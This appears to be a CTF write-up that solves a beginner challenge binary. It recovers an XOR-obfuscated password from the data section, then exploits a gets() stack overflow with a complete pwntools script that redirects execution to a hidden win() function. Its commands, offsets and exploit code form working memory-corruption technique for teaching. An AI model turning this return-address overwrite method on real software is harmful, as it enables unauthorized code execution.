Cipher Binary - CTF Writeup

Challenge Summary

This challenge combines two beginner-friendly binary exploitation concepts:

  • Reversing an XOR-encrypted password stored inside a binary.
  • Exploiting a stack buffer overflow after successful authentication.

Step 1 - Examine Binary Protections

We first inspected the binary's security protections.

pwn checksec vuln

Purpose

  • Determine whether PIE is enabled.
  • Check if a stack canary exists.
  • Verify whether NX is enabled.
  • Understand how difficult exploitation will be.

Output showed:

  • No PIE
  • No Stack Canary
  • NX Enabled

Since PIE is disabled, function addresses remain fixed every execution, making it easy to jump directly to the hidden win() function.

Step 2 - Run the Program

./vuln
Output: 
===================================
Welcome to Cipher Binary!
===================================
[*] XOR Key: 0x42
[*] Enter the password:

The binary conveniently printed the XOR key. This immediately tells us the password can be recovered because XOR is reversible.

Step 3 - Locate the Encrypted Password

objdump -t vuln | grep expected
Output: 
0000000000404040 expected
000000000040404c expected_len

Purpose

The symbol table revealed that the encrypted password is stored in the variable named expected.

Step 4 - Dump the Data Section

objdump -s --section=.data vuln
Output: 
404040
0d32272c112731232f276300

The encrypted bytes were:

0d

2c

2f

The final 00 is the null terminator.

Step 5 - Recover the Password

The encryption method was XOR.

Encryption: 

Cipher = Plaintext XOR Key

Decryption: 

Plaintext = Cipher XOR Key
Python script: 
enc = bytes([
0x0d,0x32,0x27,0x2c,0x11,
0x27,0x31,0x23,0x2f,0x27,
0x63
])

key = 0x42

print(bytes(b ^ key for b in enc))
Output: 
b'OpenSesame!'
Recovered password: 
OpenSesame!

Step 6 - Find the Hidden Function

Command: 
objdump -d vuln | grep win
Output: 
00000000004011d6 <win>

Purpose

The hidden function prints the flag. Instead of executing the normal program flow, we intend to overwrite the return address and redirect execution to this function.

Step 7 - Find Return Gadgets

Command: 
objdump -d vuln | grep ret
Chosen gadget: 
0x40101a

A single RET instruction is commonly used to maintain correct stack alignment before transferring execution to another function.

Step 8 - Reverse the Vulnerable Function

Command: 
objdump -d -Mintel vuln | sed -n '/<vuln>:/,/^$/p'
Important instructions: 
sub rsp,0x40

lea rax,[rbp-0x40]

call gets

Analysis

The compiler reserved 64 bytes on the stack: 

sub rsp,0x40
This means:
  • 64-byte local buffer
  • 8-byte saved RBP
  • Return address immediately afterwards
Therefore, 
64 + 8 = 72 bytes
After 72 bytes, the saved return address can be overwritten. The use of 
gets()
creates the vulnerability because it performs no bounds checking.

Step 9 - Build the Exploit

Python exploit: 
from pwn import *

p = process("./vuln")

p.sendline(b"OpenSesame!")

payload = b"A" * 72
payload += p64(0x40101a)
payload += p64(0x4011d6)

p.sendline(payload)

p.interactive()

Explanation

Component Purpose
OpenSesame! Passes authentication.
72 A's Overflow buffer and overwrite saved RIP.
RET gadget Aligns the stack before entering win().
win() Redirects execution to the hidden function that prints the flag.

Successful Exploitation

$ python3 exploit.py

Flag

lvjf1xDnG

Lessons Learned

  • XOR encryption is reversible when the key is known.
  • Encrypted secrets embedded inside binaries can often be recovered through reverse engineering.
  • Authentication alone does not guarantee security.
  • The unsafe gets() function is vulnerable to stack buffer overflows.
  • When PIE is disabled, function addresses remain constant, simplifying return-oriented exploitation.
  • A RET gadget may be required to maintain proper stack alignment before calling another function.
  • Combining reverse engineering with memory corruption techniques is a common pattern in binary exploitation CTF challenges.
